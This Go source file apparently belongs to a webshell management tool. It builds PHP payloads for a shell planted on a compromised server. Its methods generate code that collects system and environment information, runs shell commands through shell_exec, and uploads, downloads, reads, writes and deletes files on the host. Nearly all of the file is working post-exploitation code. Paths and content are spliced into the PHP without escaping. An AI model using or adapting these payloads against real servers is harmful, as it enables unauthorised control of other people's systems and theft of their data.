package php

import "fmt"

// php 传递code 执行
// 系统信息
type PHPWebshell struct {
}

func (p *PHPWebshell) CheckOnline() []byte {
	code := "echo 'hello'; "
	return []byte(code)
}

func (p *PHPWebshell) GetOsInfo() []byte {
	code := `function getSystemEnvVars() {
    $envVars = array();
    $envVars["PATH"] = getenv("PATH");
    $envVars["HOME"] = getenv("HOME");
    $envVars["USER"] = getenv("USER");
    $envVars["TEMP"] = getenv("TEMP");
    if (isset($_ENV) && is_array($_ENV)) {
        foreach ($_ENV as $key => $value) {
            $envVars[$key] = $value;
        }
    }
    return $envVars;
}
$data=array(
    "fileRoot"=> realpath("/"),
    "currentDir"=>getcwd(),
    "currentUser"=>get_current_user(),
    "processArch"=>(PHP_INT_SIZE * 8),
    "tempDirectory"=>sys_get_temp_dir(),
    "ipList"=>gethostbynamel(gethostname()),
    "env"=>getSystemEnvVars(),
    "os"=>array(
        "name"=>php_uname("s"),
        "version"=> php_uname("v"),
        "arch"=>php_uname("m"),
    )
);
$jsonData = json_encode($data);
echo $jsonData;`
	return []byte(code)
}

func (p *PHPWebshell) RunCmd(path string, cmd string) []byte {
	code := fmt.Sprintf(`$path = "%s";  
if (realpath($path) !== false && strpos(realpath($path), $path) === 0) {
    $escaped_command = escapeshellarg("%s");
    $output = shell_exec($escaped_command);
    echo $output;
} else {
    echo "error";
}`, path, cmd)
	return []byte(code)
}

// 上传文件
func (p *PHPWebshell) Upload(path string, fileData string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
file_put_contents($path, %s);`, path, string(fileData))
	return []byte(code)
}

// 下载文件
func (p *PHPWebshell) Download(path string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
if (file_exists($path)) {
    echo file_get_contents($path);
} else {
    echo "File not found.";
}`, path)
	return []byte(code)

}

// 读取文件
func (p *PHPWebshell) ReadFile(path string, cmd string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
if (file_exists($path)) {
    echo file_get_contents($path);
} else {
    echo "File not found.";
}`, path)
	return []byte(code)

}

// 写文件
func (p *PHPWebshell) WriteFile(path, content string, new bool) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
file_put_contents($path, "%s");`, path, content)
	return []byte(code)
}

func (p *PHPWebshell) DeleteFile(path string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
if (file_exists($path)) {
    unlink($path);
    echo "File deleted.";
} else {
    echo "File not found.";
}`, path)
	return []byte(code)
}

func (p *PHPWebshell) GetDirInfo(path string) []byte {
	code := fmt.Sprintf(`$path = "%s"; 
if (is_dir($path)) {
    $files = scandir($path);
    echo json_encode($files);
} else {
    echo "Not a valid directory.";
}`, path)
	return []byte(code)
}

func NewPHPWebShell() *PHPWebshell {
	return &PHPWebshell{}
}
